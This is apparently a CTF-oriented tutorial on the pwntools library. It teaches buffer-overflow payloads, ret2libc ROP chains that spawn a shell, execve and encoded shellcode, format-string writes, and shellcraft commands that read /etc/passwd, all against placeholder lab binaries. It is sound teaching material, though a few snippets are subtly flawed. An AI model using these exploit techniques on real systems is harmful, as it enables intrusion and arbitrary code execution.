So, you've started your journey into the fascinating world of Capture The Flag (CTF) challenges and binary exploitation. You understand the concepts—buffer overflows, Return-Oriented Programming (ROP), format string vulnerabilities. But manually crafting exploits with command-line tools and Python's raw modules can be tedious, error-prone, and frankly, not much fun.

Enter **pwntools**.

**Pwntools** is more than just a Python library; it's a swiss army knife for exploit developers. It simplifies tasks such as process interaction, networking, shellcode generation, and more. This guide will take you from a pwntools novice to a power user, ready to help in any binary exploitation challenge.

Getting started is straightforward. It's highly recommended to use a Linux environment (native, VM, or WSL2). I am using **Ubuntu 22.04.5 LTS**


```bash
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

You can test your installation in a Python shell:

```python
>>> import pwn
>>> pwn.version
'4.14.1' # or similar
```

## Basic Components

### **1. Setting the Stage: The `context`**

It tells pwntools about the environment you're targeting, so helper functions can do the right thing by default.

```python
from pwn import *

# The most important setting: let pwntools know what binary you're targeting.
# It will auto-detect the arch, OS, bits, and endianness for you!
context.binary = './vulnerable_binary'

# You can still override auto-detected settings manually:
context.arch = 'amd64'      # Architecture: 'i386', 'arm', 'aarch64'
context.os = 'linux'        # Operating System
context.endian = 'little'   # Endianness
context.bits = 64           # Pointer size

# Log level control
context.log_level = 'debug'  # 'critical', 'error', 'warning', 'info', 'debug'
```

### **2. Talking to Your Target: Tubes (`process`, `remote`)**


All communication—whether with a local binary or a server across the world—is done through a **tube**. This abstraction is powerful because you can often switch from a local `process` to a `remote` target by changing just one line of code.

```python
# Local Processes: For testing and debugging
p = process('./vulnerable_binary') # Simple execution
p = process(['./vulnerable_binary', 'arg1', 'arg2']) # With command-line arguments
p = process('./vulnerable_binary', env={'LD_PRELOAD': './libc.so.6'}) # With environment variables

# Remote Connections: For the real deal
r = remote('ctf.hackthebox.com', 1337) # Standard TCP connection
r = remote('secure-server.com', 443, ssl=True) # SSL-encrypted connection
```

### **3. The Conversation: Sending and Receiving Data**

Once you have a tube, you need to talk to it. The key is to be _specific_ in what you expect to receive to avoid your script hanging forever on a `recv()` call.

```python
# SENDING DATA
p.send(b'Hello')       # Send raw bytes (no newline)
p.sendline(b'Hello')   # Send bytes + a newline (\\n) - crucial for functions like `gets` or `scanf`

# RECEIVING DATA - THE RIGHT WAY
data = p.recv(1024)    # Receive up to 1024 bytes. Risky: what if exactly 1024 isn't sent?
line = p.recvline()    # Receive until a newline is found. Great for menus and prompts.
prompt = p.recvuntil(b'Enter input: ') # BEST PRACTICE: Wait for a specific pattern before sending.

# SENDING AFTER A PROMPT - THE MOST ROBUST METHOD
p.sendafter(b'name: ', b'Alice') # Waits for 'name: ', then sends 'Alice'
p.sendlineafter(b'> ', b'1')     # Waits for '> ', then sends '1\\n'

# WHEN YOU SUCCEED: Take control!
p.interactive() # Hands over terminal I/O to you. Use this when you get a shell!
```

### 4. Packing and Unpacking

This is where pwntools saves you from countless headaches. CPUs expect integers in specific byte orders (little-endian vs. big-endian). `p32()`, `p64()`, `u32()`, and `u64()` handle this translation seamlessly.

```python
# PACKING: Integers -> Bytes
# The classic buffer overflow payload setup
offset = 64
jmp_addr = 0x401152

payload = b'A' * offset        # Padding to fill the buffer
payload += p64(jmp_addr)       # Perfectly packed address, respecting endianness
# payload is now: b'AAAA...AAAA\\x52\\x11\\x40\\x00\\x00\\x00\\x00\\x00'

# UNPACKING: Bytes -> Integers
# Essential for parsing leaked memory addresses
p.sendline(b'%3$p') # Leak a pointer from the stack via format string
leak = p.recvline().strip()    # Leak might be b'0x7ffd4a1b2b80'
leaked_addr = int(leak, 16)    # Convert string to integer: METHOD 1
leaked_addr = u64(p.recv(6).ljust(8, b'\\x00')) # METHOD 2: Unpack raw bytes directly!
print(hex(leaked_addr))
```

### **5. Building Your Payload: ELF, ROP, and Shellcode**

Pwntools really shines when you move beyond simple overflows. Its `ELF` and `ROP` classes automate the boring parts of complex exploitation.

#### **ELF Analysis**

```python
elf = ELF('./vulnerable_binary') # Load the binary for analysis

# No more searching for addresses in GDB!
main_addr = elf.symbols['main']     # Address of main()
puts_plt = elf.plt['puts']          # Address of puts() in the PLT
puts_got = elf.got['puts']          # Address of puts()'s GOT entry

# The magic of searching for strings and gadgets
bin_sh_addr = next(elf.search(b'/bin/sh\\x00')) # Find the string "/bin/sh"
pop_rdi_ret = next(elf.search(asm('pop rdi; ret'))) # Find a ROP gadget
```

#### **ROP Chain Construction**

```python
# Automating ROP is pwntools' killer feature
rop = ROP(elf) # Create a ROP object based on the loaded ELF

# Build a chain to leak a puts() address and return to main()
rop.call(puts_plt, [puts_got]) # puts(puts_got)
rop.call(main_addr)            # return to main() after the leak

payload = flat({                # flat() is a smarter way to build payloads
    offset: rop.chain()        # It handles padding and packing automatically
})

print(rop.dump()) # Pretty-print your ROP chain for debugging
```

#### **Shellcode Generation**

```python
# Generate shellcode
shellcode = asm(shellcraft.sh())  # pwntools writes /bin/sh shellcode for you
# Defaults to context.arch

# Custom shellcode
shellcode = asm('''
    mov eax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

# Shellcode for different architectures
with context.arch('arm'):
    arm_shellcode = asm(shellcraft.arm.linux.sh())
```

### **6. The Art of Debugging: `gdb.attach()`**

If your exploit doesn't work first time (it won't), you need to see why. Pwntools integrates perfectly with GDB.

```python
# The simplest way: attach GDB to the process
# This will pause the process and open a new GDB window
gdb.attach(p)

# The professional way: pass a script to set breakpoints and run commands
gdb_script = '''
    break *vuln_function+45   # Break at a specific instruction
    break *main
    continue
'''
gdb.attach(p, gdbscript=gdb_script)

# For a clean workflow with tmux (highly recommended)
context.terminal = ['tmux', 'splitw', '-h'] # Split pane horizontally
gdb.attach(p) # GDB opens in the new pane
```

### **7. Memory Leaks and Format String Exploits**

```python
# Leak an address
payload = b'%7$p'  # Leak 7th format string parameter
p.sendline(payload)
leak = p.recvline()
leaked_addr = int(leak, 16)

# Write to memory with format string
# Write 0xdeadbeef to address 0x804a000
fmtstr_payload = fmtstr_payload(5, {0x804a000: 0xdeadbeef})
p.sendline(fmtstr_payload)
```

### **8. Fuzzing and Pattern Generation**

```python
# Generate cyclic pattern
pattern = cyclic(1024)
p.sendline(pattern)

# Find offset in crash
core = p.corefile
offset = cyclic_find(core.eip)  # or core.rip for 64-bit

# Alternative with command line
# $ cyclic 100
# $ cyclic -l 0x6161616c
```

### **Putting It All Together: A Sample Exploit Flow**

This snippet shows how these concepts combine into a coherent exploit strategy against a 64-bit binary.

```python
from pwn import *

# Setup
context.binary = elf = ELF('./vuln64')
p = process()

# Step 1: Leak a libc address with a ROP chain
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()

payload = flat({
    64: rop.chain() # Assume a 64-byte buffer
})
p.sendlineafter(b'> ', payload)

# Step 2: Calculate libc base address
leak = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc = elf.libc # pwntools can often auto-detect the libc version!
libc.address = leak - libc.symbols['puts'] # Calculate base address

# Step 3: Build a new ROP chain with the known libc base
rop = ROP(libc) # Create a ROP object for libc
rop.system(next(libc.search(b'/bin/sh\\x00'))) # system("/bin/sh")

final_payload = flat({
    64: rop.chain()
})
p.sendline(final_payload)

# Step 4: Enjoy your shell!
p.interactive()
```

## Crafting Shellcode

**shellcode** is a small piece of machine code (usually written in assembly) that is injected into a vulnerable program to perform malicious actions, most commonly spawning a shell (`/bin/sh`).

### **Key Characteristics of Shellcode:**

1. **Written in Assembly**: Shellcode is typically hand-crafted in assembly language to ensure it is compact and position-independent.
    
2. **Position-Independent Code (PIC)**: It avoids hardcoded addresses to work reliably in different memory locations.
    
3. **Avoids Null Bytes (`\x00`)**:
    
    - Many vulnerable functions (like `strcpy`) stop reading at null bytes.
    - Shellcode must be crafted to avoid them.
        
4. **Executes Arbitrary Commands**:
    
    - Common goal: Spawn a shell (`execve("/bin/sh", NULL, NULL)`).
    - Can also perform other actions like opening files, reverse shells, etc.

### **Example: Linux x86 Shellcode for `/bin/sh`**

```txt
section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    xor eax, eax      ; Clear eax
    push eax          ; Push NULL terminator
    push 0x68732f2f   ; Push "//sh" (little-endian)
    push 0x6e69622f   ; Push "/bin"
    mov ebx, esp      ; ebx = ptr to "/bin//sh"
    mov ecx, eax      ; ecx = NULL (argv)
    mov edx, eax      ; edx = NULL (envp)
    mov al, 0x0b      ; syscall number for execve
    int 0x80          ; Trigger syscall
```

If **NX (No-Execute)** is enabled, shellcode won’t work, so ROP is used instead.

Pwntools simplifies shellcode generation by:

- Providing pre-built shellcode snippets (e.g., `shellcraft.sh()` for `/bin/sh`).
- Automating assembly/disassembly (`asm()` and `disasm()`).    
- Handling architecture-specific details (x86, x64, ARM, etc.).

**Verify Installation**

```python
from pwn import *
print(pwnlib.__version__)
```

In `pwntools`, always start by setting the architecture:

```python
from pwn import *

context.arch = 'amd64'  # or 'i386', 'arm', etc.
context.os = 'linux'
```

`pwntools` has a powerful module called `shellcraft` that generates high-quality assembly for many common tasks:

```python
#shellcode = shellcraft.binary(args)
shellcode = shellcraft.sh()
print(shellcode)
```

This gives you x86_64 assembly code that spawns `/bin/sh`.

To convert assembly to raw bytes:
```python
shellcode_bytes = asm(shellcraft.sh())
```

### **Example 1: Spawning a Shell (`/bin/sh`)**

```python
from pwn import *

# Set the target architecture (default: 'i386')
context.arch = 'amd64'  # or 'i386', 'arm', 'aarch64'

# Generate shellcode for execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())
print(hexdump(shellcode))
print(f"Shellcode length: {len(shellcode)} bytes")
```

### **Example 2: Exit Shellcode (Linux x64)**
If you need custom shellcode, you can write raw assembly:


```python
from pwn import *

context.arch = 'amd64'

# Manually written assembly for exit(0)
assembly = """
    xor rdi, rdi    ; rdi = 0 (exit status)
    mov rax, 60     ; syscall number for exit
    syscall
"""

shellcode = asm(assembly)
print(hexdump(shellcode))
```

### **Example 3: Shellcode Without Null Bytes**

Some exploits fail if shellcode contains certain bytes (e.g., `\x00`, `\x0a`, `\x0d`). Pwntools helps filter them:

```python
from pwn import *

context.arch = 'i386'

# Generate shellcode avoiding bad chars
badchars = b'\x00\x0a\x0d'
shellcode = asm(shellcraft.sh())
while any(b in shellcode for b in badchars):
    shellcode = asm(shellcraft.sh())  # Regenerate if bad chars exist

print("Safe shellcode:", enhex(shellcode))
```

### **Example 4: Running Shellcode in a Process**

```python
from pwn import *

context.arch = 'amd64'
shellcode = shellcraft.sh()

# Create a test program
elf = ELF.from_assembly(shellcode, vma=0x400000)
elf.save("shellcode_test")
elf.process().interactive()  # Should spawn a shell!
```


### **Advanced: Encoded Shellcode (Alphanumeric, XOR)**

#### **Example 5: XOR-Encoded Shellcode**

```python
from pwn import *

context.arch = 'i386'  # or 'amd64' depending on your target
shellcode = asm(shellcraft.sh())

# Method 1: Using the encoder module directly
encoder = encode(shellcode, avoid=b'\x00\x0a\x0d')  # Default is XOR encoding
print("Encoded shellcode:", enhex(encoder))

# Method 2: Explicit XOR encoding with key specification
encoder = xor(shellcode, 0x41)  # XOR with 0x41
print("XOR-encoded shellcode:", enhex(encoder))
```

### **Exploiting a Buffer Overflow with Shellcode**

```python
from pwn import *

context.arch = 'i386'

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Assume a vulnerable binary with a 128-byte buffer
payload = b"A" * 128           # Padding
payload += p32(0xffffd000)     # Return address (stack)
payload += shellcode           # Shellcode

# Send payload to binary
p = process("./vulnerable_binary")
p.sendline(payload)
p.interactive()  # Enjoy your shell!
```

#### Common CTF Shellcode Examples


Read a file (like a flag)
```python
print(shellcraft.cat('/tmp/flag.txt'))
```

Print a message
```python
print(shellcraft.echo("Hello World!\n"))
```

Exit the program
```python
print(shellcraft.exit(0)) # Exit with status 0
```

You can debug shellcode using `pwntools` with GDB:

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Create executable memory with shellcode
shellcode = asm(shellcraft.sh())

# Create a raw executable file with shellcode (like a stage0 binary)
payload = asm('nop') * 100  # optional NOP sled
payload += shellcode

# Use pwntools' make_elf to convert to ELF binary
from pwnlib.asm import make_elf
binary_path = '/tmp/shellcode_runner'
with open(binary_path, 'wb') as f:
    f.write(make_elf(payload))

# Make it executable
import os
os.chmod(binary_path, 0o755)

# Run the binary
p = process([binary_path])
p.interactive()
```

To automatically delete `/tmp/shellcode_runner` after the process exits, you can use Python's `atexit` module or simply delete it manually after `p.interactive()` returns.

```python
try:
    p = process([binary_path])
    p.interactive()
finally:
    os.remove(binary_path)
    log.info(f"Deleted {binary_path}")
```

Sometimes you need to pad your shellcode:

```python
payload = asm('nop') * 100 + asm(shellcraft.sh())
```


## Creating ROP Chains with pwntools


This tutorial will guide you through **Return-Oriented Programming (ROP)** using **pwntools**, a powerful Python library for binary exploitation. ROP is a technique used to bypass security protections like **NX (No-Execute)** by chaining small code snippets ("gadgets") from existing executable memory.


### **Key Concepts**

1. **Gadgets**: Small instruction sequences ending in `ret`.
    
    - Example: `pop rdi; ret`
        
2. **ROP Chain**: A sequence of gadgets + arguments to achieve a goal.
    
3. **Calling Conventions**:
    
    - **x86-64 (System V ABI - Linux/macOS)**:
	    - First 6 integer/pointer arguments: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`
	    - Remaining arguments: Stack (right to left)
	    - Return value: `rax`
    - **x86**: 
	    - All arguments: Stack (right to left)
	    - Caller cleans the stack (cdecl), unless stdcall is used
	    - Return value: `eax`
	- **ARM (32-bit, AAPCS - Linux/Embedded):**
		- First 4 arguments: `r0`, `r1`, `r2`, `r3`
		- Remaining arguments: Stack (aligned to 4 bytes)
		- Return value: `r0` (or `r0`/`r1` for larger types)
	- **AArch64 (ARM64 - Linux/Apple/Modern Android):**
		- First 8 integer arguments: `x0`–`x7`
		- Floating-point args: `v0`–`v7`
		- Remaining arguments: Stack (aligned to 16 bytes)
		- Return value: `x0` (or `x0`/`x1` for larger types)

```mermaid
graph TD
    A[Calling Conventions by Architecture]

    A --> X86_64
    X86_64["x86-64 (System V)"]
    X86_64 --> RDI[rdi]
    X86_64 --> RSI[rsi]
    X86_64 --> RDX[rdx]
    X86_64 --> RCX[rcx]
    X86_64 --> R8[r8]
    X86_64 --> R9[r9]
    X86_64 --> X64Stack["Remaining args → Stack"]

    A --> X86
    X86["x86 (32-bit)"]
    X86 --> X86Stack["All args → Stack (right to left)"]

    A --> ARM32
    ARM32["ARM (32-bit)"]
    ARM32 --> R0[r0]
    ARM32 --> R1[r1]
    ARM32 --> R2[r2]
    ARM32 --> R3[r3]
    ARM32 --> ARM32Stack["Remaining args → Stack"]

    A --> ARM64
    ARM64["AArch64 (ARM64)"]
    ARM64 --> X0[x0]
    ARM64 --> X1[x1]
    ARM64 --> X2[x2]
    ARM64 --> X3[x3]
    ARM64 --> X4[x4]
    ARM64 --> X5[x5]
    ARM64 --> X6[x6]
    ARM64 --> X7[x7]
    ARM64 --> VARGS["FP args: v0–v7"]
    ARM64 --> ARM64Stack["Remaining args → Stack (16B aligned)"]
```





### Load the Binary


```python
from pwn import *

elf = context.binary = ELF('./vuln')  # your vulnerable binary
rop = ROP(elf)
```

### Find Useful Gadgets

```python
rop.print_gadgets()  # shows all gadgets
```

Or get specific registers:
```python
log.info(rop.rdi.address)  # pop rdi; ret;

# Find gadgets
print(rop.rdi)      # Finds 'pop rdi; ret'
print(rop.rsi_r15)  # Finds 'pop rsi; pop r15; ret'
print(rop.search(move='rax', registers=['rdi']))  # Finds 'mov rdi, rax; ret'
```
Or auto find one:
```python
rop.call('puts', [elf.got['puts']])
```

### Build the Payload

Assume:

- Buffer overflow after 40 bytes 
- NX is enabled (so we need ROP)
- Goal: Leak address of `puts`, return to main

```python
padding = b'A' * 40
rop = ROP(elf)
rop.puts(elf.got['puts'])  # leak puts@got
rop.main()                 # return to main for second stage

payload = padding + rop.chain()
```

#### Send Payload

```python
p = process(elf.path)
p.sendlineafter("Input:", payload)
p.recvline()

leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Leaked puts@GLIBC: {hex(leaked_puts)}")
```

#### Use Libc to Calculate Base

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # or libc.so from CTF
libc.address = leaked_puts - libc.symbols['puts']
```

#### Second Stage: Get Shell

```python
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
payload = b'A' * 40 + rop.chain()
p.sendline(payload)
p.interactive()
```

Here’s a pwntools template you can reuse:

```python
from pwn import *

elf = context.binary = ELF('./vuln')
rop = ROP(elf)

padding = b'A' * 40

# Stage 1: Leak puts
rop.puts(elf.got['puts'])
rop.main()
payload = padding + rop.chain()

p = process()
p.sendlineafter(">", payload)

# Parse leak
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked - libc.symbols['puts']

# Stage 2: Call system("/bin/sh")
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
payload = padding + rop.chain()
p.sendlineafter(">", payload)
p.interactive()
```

### Goal: Call `system("/bin/sh")`

1. **Find `/bin/sh` in memory** (or write it). 
2. **Find `system()` address** (from PLT/GOT or libc).
3. **Set `rdi = "/bin/sh"`** (x64 calling convention).

```python
from pwn import *

elf = ELF("./vulnerable_binary")
rop = ROP(elf)

# Find gadgets
rop.raw(b"A" * 128)  # Padding to overflow buffer
rop.rdi = next(elf.search(b"/bin/sh"))  # Set RDI = "/bin/sh"
rop.call(elf.symbols['system'])  # Call system()

# Print the ROP chain
print(rop.dump())

# Send payload
p = process("./vulnerable_binary")
p.sendline(rop.chain())
p.interactive()
```


### Advanced ROP Techniques

#### 1. Stack Pivoting

If stack space is limited, **move the stack** to a controllable location (e.g., heap).

```python
rop.raw(b"A" * 128)  # Padding
rop.rax = heap_addr  # New stack location
rop.leave_ret = rop.find_gadget(["leave", "ret"])[0]  # pivot stack
```

#### 2. Ret2Libc

Call libc functions directly (bypassing PLT).

```python
rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh"))])
```

#### 3. SigReturn-Oriented Programming (SROP)

For advanced exploitation (requires `sigreturn` syscall).

```python
frame = SigreturnFrame()
frame.rax = 0x3b            # execve syscall
frame.rdi = binsh_addr      # /bin/sh
frame.rsi = 0               # argv
frame.rdx = 0               # envp
frame.rip = syscall_addr

rop.raw(frame)
```

One of pwntools' hidden strengths is its suite of standalone command-line tools. These utilities let you perform common exploit dev tasks quickly from your terminal, making them perfect for reconnaissance, prototyping, and one-off operations.

```bash
pwn {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,libcdb,phd,pwnstrip,scramble,shellcraft,template,unhex,update,version}
```

- **`checksec`**: Your first command for any binary. It quickly analyzes the security protections enabled.
- **`elfdiff`**: Compares two ELF binaries and highlights differences in sections, symbols, and permissions. Great for analyzing patched binaries.
- **`phd`** (Pwn HexDump): A powerful hex dumper with colorized output and disassembly side-by-side. Better than `xxd` or `hexdump` for our purposes.
- **`cyclic`**: **The** tool for finding offsets in buffer overflows.
- **`shellcraft`**: Generate shellcode from your terminal. Specify architecture and constraints.
- **`asm` / `disasm`**: Quick assembly and disassembly on the command line.
- **`constgrep`**: Incredibly useful for finding constants in files (often your libc.so). No more searching for "/bin/sh" in a hex editor!
- **`debug`**: A wrapper to run a binary with your chosen debugger (GDB by default) and pre-set options. Perfect for a quick start.
- **`disablenx`**: Creates a copy of a binary with the NX bit disabled. Useful for testing shellcode execution if you're struggling with ROP and just want to verify control flow.
- **`template`**: The ultimate exploit script starter. Generates a well-commented Python template for you to build upon.
- **`hex` / `unhex`**: Quickly convert between ASCII/hex and raw bytes. Great for command-line piping.
- **`errno`**: Look up the meaning of an errno number. Useful when your exploits fail mysteriously.

## pwn shellcraft


**1. List available shellcodes**

```bash
pwn shellcraft -l
# Optional filtering:
pwn shellcraft -l i386
```

**2. Print shellcode (default: hex string)**

```bash
pwn shellcraft i386.linux.sh
```

**3. Get assembly output**

Available formats:
('r', 'raw', 's', 'str', 'string', 'c', 'h', 'hex', 'a', 'asm', 'assembly', 'p', 'i', 'hexii', 'e', 'elf', 'd', 'escaped', 'default')
```bash
pwn shellcraft -f asm sh

# Save raw shellcode
pwn shellcraft -f raw amd64.linux.sh -o shellcode.bin
# Save as ELF (binary)
pwn shellcraft -f elf amd64.linux.sh -o shellcode.bin
```

**4. Directly Run the shellcode (`-r`)**

```bash
# Run shellcode with QEMU (experimental)
pwn shellcraft amd64.linux.sh -r
```
This executes the shellcode in a sandbox (if properly configured).

**5. Avoid bad characters (e.g., null bytes)**

```bash
# -v AVOID, --avoid AVOID
#                       Encode the shellcode to avoid the listed bytes
# -n, --newline         Encode the shellcode to avoid newlines
# -z, --zero            Encode the shellcode to avoid NULL bytes

$ pwn shellcraft sh -z
$ pwn shellcraft sh -v 00aabbcc
```

**6. Debug Shellcode in GDB (`-d`)**

```bash
pwn shellcraft -d amd64.linux.sh
```

**7. Concatenate multiple shellcodes**

```bash
# shellcode [args ...] [+ shellcode [args ...]]
pwn shellcraft amd64.linux.cat '/etc/passwd' + amd64.linux.echo 'Hello World!'

# Verify
pwn shellcraft amd64.linux.cat '/etc/passwd' -r
pwn shellcraft amd64.linux.cat '/etc/passwd' + amd64.linux.echo 'Hello World!' + amd64.linux.syscalls.exit 1 -f elf -o sh
```